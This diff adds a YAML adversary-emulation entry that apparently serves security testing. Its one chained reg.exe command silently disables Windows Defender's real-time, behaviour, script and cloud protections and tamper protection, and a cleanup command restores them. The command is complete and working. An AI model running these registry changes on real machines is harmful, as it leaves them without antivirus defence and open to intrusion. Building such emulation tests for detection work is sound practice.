@@ -1,0 +1,79 @@
+---
+- id: 8d226cdcf408ed34fc3f96efab8c5a78
+  name: Tamper with Windows Defender Registry - Reg.exe
+  description: 'Disable Windows Defender by tampering with windows defender registry
+    using the utility "reg.exe"
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      cmd:
+        command: reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware"
+          /t REG_DWORD /d "1" /f >NUL 2>nul && reg add "HKLM\Software\Policies\Microsoft\Windows
+          Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f >NUL 2>nul && reg
+          add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"
+          /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul && reg
+          add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"
+          /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f >NUL 2>nul
+          && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
+          && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
+          && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul
+          && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f >NUL
+          2>nul && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f >NUL
+          2>nul && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" /v "DisableScriptScanning" /t REG_DWORD /d "1" /f >NUL 2>nul
+          && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"
+          /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f >NUL 2>nul  &&
+          reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen"
+          /t REG_DWORD /d "1" /f >NUL 2>nul && reg add "HKLM\Software\Policies\Microsoft\Windows
+          Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f >NUL 2>nul
+          && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"
+          /v "MpEnablePus" /t REG_DWORD /d "0" /f >NUL 2>nul && reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows
+          Defender Security Center\App and Browser protection" /v "DisallowExploitProtectionOverride"
+          /t REG_DWORD /d "0" /f >NUL 2>nul && reg add "HKLM\SOFTWARE\Microsoft\Windows
+          Defender\Features" /v "TamperProtection"  /t REG_DWORD /d "0" /f >NUL 2>nul
+          && reg add "HKLM\software\microsoft\windows defender\spynet" /v "SubmitSamplesConsent"
+          /t REG_DWORD /d "0" /f >NUL 2>nul && reg add "HKLM\Software\Microsoft\Windows
+          Defender" /v "PUAProtection" /t REG_DWORD /d "0" /f >NUL 2>nul
+        payloads: []
+        cleanup: reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware"
+          /t REG_DWORD /d "0" /f >NUL 2>nul && reg add "HKLM\Software\Policies\Microsoft\Windows
+          Defender" /v "DisableAntiVirus" /t REG_DWORD /d "0" /f >NUL 2>nul && reg
+          add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"
+          /v "DisableBehaviorMonitoring" /t REG_DWORD /d "0" /f >NUL 2>nul && reg
+          add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"
+          /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "0" /f >NUL 2>nul
+          && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "0" /f >NUL 2>nul
+          && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "0" /f >NUL 2>nul
+          && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "0" /f >NUL 2>nul
+          && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "0" /f >NUL
+          2>nul && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "0" /f >NUL
+          2>nul && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" /v "DisableScriptScanning" /t REG_DWORD /d "0" /f >NUL 2>nul
+          && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"
+          /v "DisableEnhancedNotifications" /t REG_DWORD /d "0" /f >NUL 2>nul  &&
+          reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen"
+          /t REG_DWORD /d "0" /f >NUL 2>nul && reg add "HKLM\Software\Policies\Microsoft\Windows
+          Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "1" /f >NUL 2>nul
+          && reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"
+          /v "MpEnablePus" /t REG_DWORD /d "1" /f >NUL 2>nul && reg add "HKLM\Software\Policies\Microsoft\Windows
+          Defender Security Center\App and Browser protection" /v "DisallowExploitProtectionOverride"
+          /t REG_DWORD /d "1" /f >NUL 2>nul && reg add "HKLM\Software\Microsoft\Windows
+          Defender\Features" /v "TamperProtection"  /t REG_DWORD /d "1" /f >NUL 2>nul
+          && reg add "HKLM\software\microsoft\windows defender\spynet" /v "SubmitSamplesConsent"
+          /t REG_DWORD /d "1" /f >NUL 2>nul && reg add "HKLM\Software\Microsoft\Windows
+          Defender" /v "PUAProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
